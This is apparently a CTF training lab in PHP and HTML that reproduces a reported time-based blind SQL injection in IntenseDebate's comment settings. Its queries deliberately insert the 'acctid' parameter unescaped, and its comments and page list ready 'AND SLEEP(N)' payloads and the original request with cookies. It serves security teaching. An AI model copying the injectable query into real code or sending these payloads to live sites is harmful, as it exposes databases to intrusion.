<?php
// ============================================================
// SQL Injection Lab 122 — Time-Based Blind SQLi in GET `acctid`
// Platform: IntenseDebate Comment Settings (Automattic)
// HackerOne Report #1042746 (Critical — Automattic)
//
// PRIMARY endpoint:
//   GET /changeReplaceOpt.php?opt=1&acctid=419523
//   ↓ VULNERABLE — no WAF, no bypass needed
//   GET /index.php?opt=1&acctid=419523 AND SLEEP(7)   → ~7s
//   GET /index.php?opt=1&acctid=419523 AND SLEEP(15)  → ~15s (exact from report)
//   URL-encoded: acctid=419523%20AND%20SLEEP(15)
//
// BONUS second endpoint (reporter's second discovery):
//   GET /js/commentAction/?data={"params":{"acctid":"419523 AND SLEEP(7)"}}
//   GET /index.php?data={"action":"commentAction","params":{"acctid":"419523 AND SLEEP(7)"}}
//
// This is the SIMPLEST time-based blind SQLi — no quotes needed,
// no WAF, no bypass technique. Plain integer injection: AND SLEEP(N)
// ============================================================

$server   = "localhost";
$username = "root";
$password = "";
$database = "VexiumCTF_DB";

$conn = mysqli_connect($server, $username, $password);
if (!$conn) die(json_encode(["success" => false, "error" => "DB error"]));
mysqli_query($conn, "CREATE DATABASE IF NOT EXISTS $database");
mysqli_select_db($conn, $database);

function initializeLab122Database($conn) {
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab122_accounts (
        id              INT AUTO_INCREMENT PRIMARY KEY,
        acctid          INT NOT NULL,
        username        VARCHAR(60)  NOT NULL,
        email           VARCHAR(100) NOT NULL,
        blog_url        VARCHAR(200) NOT NULL DEFAULT '',
        country_code    VARCHAR(5)   NOT NULL DEFAULT 'US',
        opt_replace     TINYINT(1)   NOT NULL DEFAULT 1,
        opt_threading   TINYINT(1)   NOT NULL DEFAULT 1,
        opt_notify      TINYINT(1)   NOT NULL DEFAULT 0,
        created_at      DATETIME     NOT NULL,
        UNIQUE KEY uk_acctid (acctid)
    )");
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab122_secret (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        secret_data VARCHAR(100) NOT NULL
    )");
    $chkS = mysqli_query($conn, "SELECT * FROM lab122_secret LIMIT 1");
    if (mysqli_num_rows($chkS) == 0) {
        mysqli_query($conn, "INSERT INTO lab122_secret (secret_data) VALUES ('flag{intensedebate_acctid_sqli_1042746}')");
    }
    $chkA = mysqli_query($conn, "SELECT COUNT(*) AS c FROM lab122_accounts");
    $r = mysqli_fetch_assoc($chkA);
    if ((int)$r['c'] === 0) {
        // Single row — UNIQUE key on acctid ensures SLEEP(N) executes exactly once
        mysqli_query($conn, "INSERT INTO lab122_accounts (acctid, username, email, blog_url, country_code, opt_replace, opt_threading, opt_notify, created_at) VALUES
            (419523, 'fuzzme', 'fuzzme@example.com', 'https://myblog.example.com', 'FR', 1, 1, 0, '2020-11-01 10:00:00')");
    }
}
initializeLab122Database($conn);

// ============================================================
// API: GET with ?opt=&acctid=  →  PRIMARY vulnerable endpoint
// Simulates: GET /changeReplaceOpt.php?opt=1&acctid=PAYLOAD
// ============================================================
if (isset($_GET['opt']) || isset($_GET['acctid'])) {
    header('Content-Type: application/json; charset=utf-8');
    header('X-Powered-By: IntenseDebate/3.1');

    $acctid = $_GET['acctid'] ?? '';
    $opt    = $_GET['opt']    ?? '1';

    // ====================================================================
    // ⚠ VULNERABLE — $acctid integer injected directly into WHERE clause
    //   No WAF, no bypass needed.
    //
    //   Normal:   WHERE acctid = 419523           → instant
    //
    //   SQLi:     WHERE acctid = 419523 AND SLEEP(7)   → ~7s  ← confirmed
    //             WHERE acctid = 419523 AND SLEEP(15)  → ~15s
    //
    //   URL form: ?opt=1&acctid=419523%20AND%20SLEEP(15)
    //
    //   Exact request from HackerOne report #1042746:
    //   GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(15) HTTP/1.1
    //   Host: www.intensedebate.com
    //   Cookie: country_code=FR; idcomments_userid=26745306; ...
    // ====================================================================
    $sql    = "SELECT acctid, username, email, blog_url, country_code,
                      opt_replace, opt_threading, opt_notify
               FROM lab122_accounts
               WHERE acctid = $acctid";
    $result = mysqli_query($conn, $sql);

    if ($result === false) {
        http_response_code(500);
        echo json_encode([
            "success"  => false,
            "error"    => "Query failed",
            "sqlstate" => mysqli_sqlstate($conn),
            "message"  => mysqli_error($conn)
        ]);
        exit;
    }

    $row = mysqli_fetch_assoc($result);
    if ($row) {
        echo json_encode([
            "success" => true,
            "opt"     => (int)$opt,
            "account" => $row
        ]);
    } else {
        echo json_encode(["success" => false, "error" => "Account not found"]);
    }
    exit;
}

// ============================================================
// API: GET with ?data=JSON  →  BONUS second vulnerable endpoint
// Simulates: GET /js/commentAction/?data={"params":{"acctid":"..."}}
// Reporter's second finding (nested JSON acctid)
// ============================================================
if (isset($_GET['data'])) {
    header('Content-Type: application/json; charset=utf-8');
    header('X-Powered-By: IntenseDebate/3.1');

    $dataStr = $_GET['data'];
    $decoded = json_decode($dataStr, true);
    $acctid  = $decoded['params']['acctid'] ?? '';

    // ====================================================================
    // ⚠ VULNERABLE — acctid extracted from nested JSON, injected raw
    //   ?data={"action":"commentAction","params":{"acctid":"419523 AND SLEEP(7)"}}
    //   → ~7s delay
    // ====================================================================
    $sql    = "SELECT acctid, username, blog_url, country_code
               FROM lab122_accounts
               WHERE acctid = $acctid";
    $result = mysqli_query($conn, $sql);

    if ($result === false) {
        http_response_code(500);
        echo json_encode(["success" => false, "error" => mysqli_error($conn)]);
        exit;
    }

    $row = mysqli_fetch_assoc($result);
    echo json_encode($row
        ? ["success" => true, "action" => $decoded['action'] ?? '', "account" => $row]
        : ["success" => false, "error" => "Account not found"]
    );
    exit;
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Comment Settings — IntenseDebate</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f0f0;color:#333;font-size:13px;min-height:100vh;display:flex;flex-direction:column;}

/* ── Header ──────────────────────────────────────────────────────────────── */
.id-header{background:#3b9ddd;padding:0;}
.id-header-inner{display:flex;align-items:center;gap:12px;padding:0 20px;height:48px;max-width:960px;margin:0 auto;}
.id-logo{display:flex;align-items:center;gap:7px;text-decoration:none;}
.id-logo-icon{width:26px;height:26px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;}
.id-logo-icon svg{width:15px;height:15px;fill:#3b9ddd;}
.id-logo-text{font-size:.95rem;font-weight:800;color:#fff;letter-spacing:.01em;}
.id-header-right{margin-left:auto;font-size:.72rem;color:rgba(255,255,255,.75);display:flex;align-items:center;gap:12px;}
.id-header-right a{color:rgba(255,255,255,.75);text-decoration:none;}.id-header-right a:hover{color:#fff;}
.id-header-right strong{color:#fff;}

/* ── Nav ─────────────────────────────────────────────────────────────────── */
.id-nav{background:#2c3e50;display:flex;align-items:center;padding:0 20px;max-width:960px;margin:0 auto;width:100%;}
.id-nav-wrap{max-width:960px;margin:0 auto;background:#2c3e50;width:100%;}
.id-nav a{color:rgba(255,255,255,.6);padding:9px 14px;font-size:.75rem;font-weight:600;text-decoration:none;border-bottom:3px solid transparent;display:inline-block;letter-spacing:.02em;}
.id-nav a:hover{color:#fff;}
.id-nav a.active{color:#fff;border-bottom-color:#3b9ddd;}

/* ── Content ─────────────────────────────────────────────────────────────── */
.id-wrap{max-width:960px;margin:0 auto;padding:20px;flex:1;width:100%;}
.id-content{display:grid;grid-template-columns:220px 1fr;gap:16px;}

/* ── Sidebar ─────────────────────────────────────────────────────────────── */
.id-sidebar{background:#fff;border:1px solid #ddd;border-radius:3px;overflow:hidden;}
.id-sidebar-header{background:#3b9ddd;color:#fff;font-size:.72rem;font-weight:700;padding:8px 12px;text-transform:uppercase;letter-spacing:.06em;}
.id-sidebar-item{display:block;padding:8px 12px;font-size:.78rem;color:#555;text-decoration:none;border-bottom:1px solid #f0f0f0;}
.id-sidebar-item:hover{background:#f9f9f9;color:#3b9ddd;}
.id-sidebar-item.active{background:#eaf5fb;color:#3b9ddd;font-weight:600;border-left:3px solid #3b9ddd;}

/* ── Main Panel ──────────────────────────────────────────────────────────── */
.id-panel{background:#fff;border:1px solid #ddd;border-radius:3px;overflow:hidden;}
.id-panel-header{background:#f7f7f7;border-bottom:1px solid #e0e0e0;padding:11px 16px;display:flex;align-items:center;justify-content:space-between;}
.id-panel-title{font-size:.88rem;font-weight:700;color:#2c3e50;}
.id-panel-sub{font-size:.68rem;color:#999;}
.id-panel-body{padding:18px;}

/* ── Account Info strip ──────────────────────────────────────────────────── */
.id-acct-strip{background:#eaf5fb;border:1px solid #b8e0f5;border-radius:3px;padding:8px 12px;display:flex;gap:20px;margin-bottom:18px;font-size:.75rem;flex-wrap:wrap;}
.id-acct-field{display:flex;flex-direction:column;gap:2px;}
.id-acct-label{color:#888;font-size:.65rem;text-transform:uppercase;letter-spacing:.05em;font-weight:600;}
.id-acct-val{color:#2c3e50;font-weight:700;font-family:monospace;}

/* ── Settings Form ───────────────────────────────────────────────────────── */
.id-section-title{font-size:.78rem;font-weight:700;color:#2c3e50;margin:0 0 10px;border-bottom:1px solid #f0f0f0;padding-bottom:6px;text-transform:uppercase;letter-spacing:.05em;}
.id-option-row{display:flex;align-items:flex-start;gap:10px;margin-bottom:12px;}
.id-option-row input[type=checkbox]{width:15px;height:15px;margin-top:1px;accent-color:#3b9ddd;flex-shrink:0;}
.id-option-label{font-size:.82rem;color:#444;line-height:1.4;}
.id-option-label strong{display:block;font-weight:700;color:#2c3e50;}
.id-option-label span{font-size:.72rem;color:#888;}

/* ── Opt selector ────────────────────────────────────────────────────────── */
.id-opt-row{display:flex;align-items:center;gap:10px;margin-bottom:18px;}
.id-opt-row label{font-size:.78rem;font-weight:700;color:#2c3e50;white-space:nowrap;}
.id-opt-select{border:1px solid #ccc;border-radius:3px;padding:4px 8px;font-size:.78rem;font-family:inherit;outline:none;}

/* ── Buttons ─────────────────────────────────────────────────────────────── */
.id-btn-save{background:#27ae60;color:#fff;border:none;border-radius:3px;padding:8px 18px;font-size:.78rem;font-weight:700;cursor:pointer;font-family:inherit;transition:background .15s;}
.id-btn-save:hover{background:#219a52;}
.id-btn-save:disabled{opacity:.6;cursor:not-allowed;}
.id-btn-cancel{background:#f0f0f0;color:#555;border:1px solid #ccc;border-radius:3px;padding:8px 14px;font-size:.78rem;font-weight:600;cursor:pointer;font-family:inherit;}

/* ── Status bar ──────────────────────────────────────────────────────────── */
.id-status-bar{margin-top:14px;border-radius:3px;padding:8px 12px;font-size:.75rem;display:none;}
.id-status-bar.ok{background:#d4edda;border:1px solid #c3e6cb;color:#155724;}
.id-status-bar.err{background:#f8d7da;border:1px solid #f5c6cb;color:#721c24;}
.id-status-bar code{font-size:.72rem;background:rgba(0,0,0,.07);padding:1px 4px;border-radius:2px;}

/* ── Req info box ────────────────────────────────────────────────────────── */
.id-req-box{background:#f7f7f7;border:1px solid #e0e0e0;border-radius:3px;padding:10px 12px;margin-top:16px;}
.id-req-title{font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:#888;margin-bottom:6px;}
.id-req-line{font-family:monospace;font-size:.72rem;color:#2c3e50;background:#fff;border:1px solid #e8e8e8;padding:4px 8px;border-radius:2px;margin-bottom:4px;word-break:break-all;}
.id-req-label{display:inline-block;font-size:.65rem;background:#3b9ddd;color:#fff;padding:1px 5px;border-radius:2px;margin-right:5px;font-weight:700;}
.id-req-warn{font-size:.68rem;color:#e74c3c;font-weight:700;margin-top:6px;}

/* ── Footer ──────────────────────────────────────────────────────────────── */
footer{background:#2c3e50;color:#888;font-size:.68rem;padding:10px 20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;}
footer a{color:#888;text-decoration:none;}.footer a:hover{color:#3b9ddd;}
</style>
</head>
<body>

<!-- Header -->
<header style="background:#3b9ddd;">
  <div class="id-header-inner">
    <a class="id-logo" href="#">
      <div class="id-logo-icon">
        <svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
      </div>
      <span class="id-logo-text">IntenseDebate</span>
    </a>
    <div class="id-header-right">
      Logged in as <strong>fuzzme</strong> &nbsp;·&nbsp;
      <a href="#">Account</a> &nbsp;·&nbsp;
      <a href="#">Log Out</a>
    </div>
  </div>
</header>

<div class="id-nav-wrap">
  <div style="max-width:960px;margin:0 auto;">
    <a class="id-nav a" href="#" style="color:rgba(255,255,255,.6);padding:9px 14px;font-size:.75rem;font-weight:600;text-decoration:none;display:inline-block;">Dashboard</a>
    <a href="#" style="color:rgba(255,255,255,.6);padding:9px 14px;font-size:.75rem;font-weight:600;text-decoration:none;display:inline-block;">Comments</a>
    <a href="#" style="color:#fff;padding:9px 14px;font-size:.75rem;font-weight:600;text-decoration:none;border-bottom:3px solid #3b9ddd;display:inline-block;">Settings</a>
    <a href="#" style="color:rgba(255,255,255,.6);padding:9px 14px;font-size:.75rem;font-weight:600;text-decoration:none;display:inline-block;">Install</a>
    <a href="#" style="color:rgba(255,255,255,.6);padding:9px 14px;font-size:.75rem;font-weight:600;text-decoration:none;display:inline-block;">Support</a>
  </div>
</div>

<div class="id-wrap">
<div class="id-content">

  <!-- Sidebar -->
  <div>
    <div class="id-sidebar">
      <div class="id-sidebar-header">Settings</div>
      <a class="id-sidebar-item active" href="#">Comment Options</a>
      <a class="id-sidebar-item" href="#">Moderation</a>
      <a class="id-sidebar-item" href="#">Notifications</a>
      <a class="id-sidebar-item" href="#">Appearance</a>
      <a class="id-sidebar-item" href="#">Import / Export</a>
      <a class="id-sidebar-item" href="#">API Keys</a>
    </div>
    <div style="margin-top:10px;background:#fff;border:1px solid #ddd;border-radius:3px;overflow:hidden;">
      <div style="background:#e74c3c;color:#fff;font-size:.68rem;font-weight:700;padding:6px 10px;text-transform:uppercase;letter-spacing:.06em;">Lab Info</div>
      <div style="padding:10px;font-size:.7rem;line-height:1.6;color:#555;">
        <div style="font-weight:700;color:#2c3e50;margin-bottom:4px;">HackerOne #1042746</div>
        Critical · Automattic<br>
        Vuln: <strong>GET acctid integer</strong><br>
        No WAF · No bypass needed<br><br>
        <div style="font-size:.65rem;font-family:monospace;background:#f7f7f7;padding:4px;border-radius:2px;word-break:break-all;">
          acctid=419523%20AND%20SLEEP(15)
        </div>
      </div>
    </div>
  </div>

  <!-- Main Panel -->
  <div class="id-panel">
    <div class="id-panel-header">
      <div>
        <div class="id-panel-title">Comment Settings — changeReplaceOpt</div>
        <div class="id-panel-sub">Configure comment replacement and threading options</div>
      </div>
    </div>
    <div class="id-panel-body">

      <!-- Account info strip -->
      <div class="id-acct-strip">
        <div class="id-acct-field">
          <span class="id-acct-label">Account ID</span>
          <span class="id-acct-val">419523</span>
        </div>
        <div class="id-acct-field">
          <span class="id-acct-label">Username</span>
          <span class="id-acct-val">fuzzme</span>
        </div>
        <div class="id-acct-field">
          <span class="id-acct-label">Blog</span>
          <span class="id-acct-val">myblog.example.com</span>
        </div>
        <div class="id-acct-field">
          <span class="id-acct-label">Country</span>
          <span class="id-acct-val">FR</span>
        </div>
      </div>

      <!-- Settings Form -->
      <div class="id-section-title">Replace Options</div>

      <div class="id-opt-row">
        <label>Option (opt):</label>
        <select class="id-opt-select" id="optSelect">
          <option value="1" selected>1 — Replace all existing comments</option>
          <option value="2">2 — Replace only new comments</option>
          <option value="3">3 — Do not replace</option>
        </select>
      </div>

      <div class="id-option-row">
        <input type="checkbox" id="chkThreading" checked>
        <label class="id-option-label" for="chkThreading">
          <strong>Enable Comment Threading</strong>
          <span>Allow nested comment replies. Recommended for active discussions.</span>
        </label>
      </div>

      <div class="id-option-row">
        <input type="checkbox" id="chkReplace" checked>
        <label class="id-option-label" for="chkReplace">
          <strong>Replace Existing Comments</strong>
          <span>Migrate existing blog comments into IntenseDebate.</span>
        </label>
      </div>

      <div class="id-option-row">
        <input type="checkbox" id="chkNotify">
        <label class="id-option-label" for="chkNotify">
          <strong>Email Notifications</strong>
          <span>Receive email when new comments are posted.</span>
        </label>
      </div>

      <div style="display:flex;gap:8px;margin-top:16px;">
        <button class="id-btn-save" id="saveBtn" onclick="saveSettings()">Save Settings</button>
        <button class="id-btn-cancel">Cancel</button>
      </div>

      <!-- Status bar -->
      <div class="id-status-bar" id="statusBar"></div>

      <!-- Vulnerable request info box -->
      <div class="id-req-box">
        <div class="id-req-title">Intercepted Request (Burp Proxy)</div>
        <div class="id-req-line">
          <span class="id-req-label">GET</span>
          /changeReplaceOpt.php?<strong>opt=1</strong>&amp;<strong style="color:#e74c3c;">acctid=419523</strong> HTTP/1.1
        </div>
        <div class="id-req-line">Host: www.intensedebate.com</div>
        <div class="id-req-line">Cookie: country_code=FR; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3|1607463572</div>
        <div class="id-req-warn">
          ⚠ Modify acctid in Repeater:
          acctid=419523%20AND%20SLEEP(7) → 7,486ms response
          &nbsp;|&nbsp; acctid=419523%20AND%20SLEEP(15) → 15,414ms response
        </div>
      </div>

      <!-- Bonus second endpoint -->
      <div class="id-req-box" style="margin-top:10px;border-color:#f0c040;background:#fffdf0;">
        <div class="id-req-title" style="color:#b8860b;">Bonus: Second Vulnerable Endpoint (reporter's second finding)</div>
        <div class="id-req-line" style="font-size:.68rem;">
          <span class="id-req-label" style="background:#e67e22;">GET</span>
          /js/commentAction/?data={"action":"commentAction","params":{"acctid":"419523 AND SLEEP(7)"}}
        </div>
        <div style="font-size:.68rem;color:#888;margin-top:4px;">
          Try: <code style="font-size:.68rem;background:#f5f5f5;padding:1px 4px;">index.php?data={"action":"commentAction","params":{"acctid":"419523 AND SLEEP(7)"}}</code>
        </div>
      </div>

    </div>
  </div><!-- .id-panel -->

</div><!-- .id-content -->
</div><!-- .id-wrap -->

<footer>
  <span>IntenseDebate v3.1 · © 2020 Automattic Inc. · www.intensedebate.com</span>
  <span>
    <a href="https://hackerone.com/reports/1042746" target="_blank" rel="noopener">HackerOne #1042746</a>
    &nbsp;·&nbsp; Critical · Automattic
  </span>
</footer>

<script>
async function saveSettings() {
    var btn = document.getElementById('saveBtn');
    var bar = document.getElementById('statusBar');
    btn.disabled = true;
    btn.textContent = 'Saving…';
    bar.className = 'id-status-bar';
    bar.style.display = 'none';

    var opt    = document.getElementById('optSelect').value;
    var acctid = 419523;  // account ID in URL

    // ================================================================
    // ⚠ This GET request is the VULNERABLE one (students intercept in Burp)
    //
    // Simulates: GET /changeReplaceOpt.php?opt=1&acctid=419523 HTTP/1.1
    //            Host: www.intensedebate.com
    //            Cookie: country_code=FR; idcomments_userid=26745306; ...
    //
    // Integer GET parameter — no quotes needed, no WAF, no bypass:
    //   acctid=419523                        → instant
    //   acctid=419523 AND SLEEP(7)           → ~7s   ← confirmed SQLi
    //   acctid=419523 AND SLEEP(15)          → ~15s  ← from report
    //   URL-encoded: acctid=419523%20AND%20SLEEP(15)
    // ================================================================
    try {
        var resp = await fetch('index.php?opt=' + opt + '&acctid=' + acctid);
        var data = await resp.json();

        if (data.success) {
            var a = data.account;
            bar.className = 'id-status-bar ok';
            bar.innerHTML = '&#10003; Settings saved successfully. ' +
                'Account <code>' + a.acctid + '</code> · ' +
                'Threading: <code>' + (a.opt_threading ? 'on' : 'off') + '</code> · ' +
                'Replace: <code>' + (a.opt_replace ? 'on' : 'off') + '</code> · ' +
                'Country: <code>' + a.country_code + '</code>';
        } else {
            bar.className = 'id-status-bar err';
            bar.innerHTML = '&#10007; Error: ' + (data.error || 'Unknown error');
        }
    } catch(e) {
        bar.className = 'id-status-bar err';
        bar.innerHTML = '&#10007; Network error: ' + e.message;
    }

    bar.style.display = 'block';
    btn.disabled = false;
    btn.textContent = 'Save Settings';
}
</script>

</body>
</html>
